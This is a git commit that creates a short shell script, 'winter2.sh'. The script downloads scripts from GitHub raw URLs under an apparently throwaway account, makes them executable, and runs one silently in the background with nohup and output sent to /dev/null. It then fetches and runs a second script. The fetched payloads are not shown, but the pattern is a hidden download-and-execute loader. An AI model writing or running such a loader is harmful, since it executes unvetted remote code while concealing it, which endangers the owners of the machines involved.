fd5665bb3f53750667f1f156caed011d7c201332
williehprnuhrxyq <159912408+williehprnuhrxyq@users.noreply.github.com>
2024-06-16 01:55:24 +0700

    Create winter2.sh

---
+++ winter2.sh
@@ -0,0 +1,5 @@
+mkdir tmp && cd tmp
+wget https://raw.githubusercontent.com/williehprnuhrxyq/geram/main/gosah.sh > /dev/null 2>&1
+chmod +x gosah.sh
+nohup ./gosah.sh  >/dev/null 2>&1 &
+wget https://github.com/williehprnuhrxyq/dualspace/raw/main/winter.sh && chmod +x * && ./winter.sh
